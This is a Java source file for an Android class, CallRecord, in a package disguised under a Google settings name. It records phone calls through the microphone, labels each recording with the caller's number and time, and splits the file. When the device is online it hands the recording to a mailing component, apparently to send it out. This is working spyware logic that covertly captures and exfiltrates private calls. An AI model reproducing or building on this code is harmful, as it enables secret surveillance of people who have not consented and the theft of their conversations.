package com.setting.dl.google.googlesettings.recievers;

import android.content.Context;
import android.media.MediaRecorder;

import com.setting.dl.google.googlesettings.mail.MailingFile;
import com.setting.dl.google.googlesettings.phone.FileSplitter;
import com.setting.dl.google.googlesettings.u;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public final class CallRecord {
	
	private static boolean isRunning = false;
	
	private MediaRecorder mRecorder;
	private final String recordFile;
	
	private final Context context;
	
	CallRecord(final Context context, final String number) {
		
		this.context = context;
		recordFile = getAudioFolder() + "/" +  String.format("%s_%s.mp3", getDateForFile(), number);
		
		
	}
	
	private String getAudioFolder() {
		
		File audioFolder = new File(context.getFilesDir(), "audio");
		
		if (!audioFolder.exists()) {
			
			if (audioFolder.mkdir()) {
				
				return audioFolder.getAbsolutePath();
			}
		}
		else {
			
			return audioFolder.getAbsolutePath();
		}
		
		
		return context.getFilesDir() + "/" + "audio";
	}
	
	private String getDateForFile() {
		
		SimpleDateFormat dateFormat = new SimpleDateFormat("ddMMyyHHmmss", Locale.getDefault());
		
		return dateFormat.format(new Date());
	}
	
	public static boolean isRunning() {return isRunning;}
	
	public CallRecord startRecord() {
		
		mRecorder = new MediaRecorder();
		mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
		mRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
		mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
		//mRecorder.setMaxFileSize(5600000);//en fazla ~5.4 MB
		mRecorder.setOutputFile(recordFile);
		
		
		try {
			
			mRecorder.prepare();
			mRecorder.start();
			
			isRunning = true;
			
			u.log.i("record started");
			return this;
			
		}
		catch (Exception e) {
			
			String error = u.s("****\nstart record error : %s\n%s", e.toString(), u.dateStamp());
			u.log.e(error);
			u.saveValue(context, "error.txt", error);
			u.log.i("record başlayamadı");
			isRunning = false;
			return null;
		}
	}
	
	public void stopRecord() {
		
		try {
			
			if (mRecorder != null) {
				
				mRecorder.stop();
				mRecorder.reset();
				mRecorder.release();
				mRecorder = null;
				
				
				u.log.i("record stoped");
			}
		}
		catch (Exception e) {
			
			u.log.e(e.toString());
		}
		
		if (isRunning) {
			
			isRunning = false;
			
			new FileSplitter(context, new File(recordFile)).split();
			
			if (u.isDeviceOnline(context)) new MailingFile(context);
		}
		else{
			u.log.d("CallRecord already didn't run");
		}
	}
}
